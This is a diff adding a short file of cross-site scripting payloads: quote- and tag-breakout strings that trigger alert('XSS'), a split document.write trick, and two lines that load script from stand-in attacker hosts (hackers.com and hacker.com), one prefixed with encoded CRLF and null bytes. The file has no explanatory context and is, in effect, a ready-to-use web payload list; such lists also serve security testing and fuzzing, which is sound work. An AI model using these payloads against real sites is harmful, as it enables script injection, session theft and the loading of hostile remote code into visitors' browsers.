@@ -1,0 +1,16 @@
+`> <script>alert('XSS')</script>
+ > <script>alert('XSS')</script>
+/> <script>alert('XSS')</script>
+\";<script>alert('XSS');</script>
+";<script>alert('XSS');</script>
+"><SCRIPT>alert('XSS');</SCRIPT>
+'><SCRIPT>alert('XSS');</SCRIPT>
+;<script>alert('XSS');</script>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://hackers.com/xss.js"></SCRIPT>
+0%0d%0a%00<script src=//hacker.com/xss.js>
+
+
+ >"'
+
+http://aa"><script>alert('XSS')</script>
+'';!--"<XSS>=&{()}
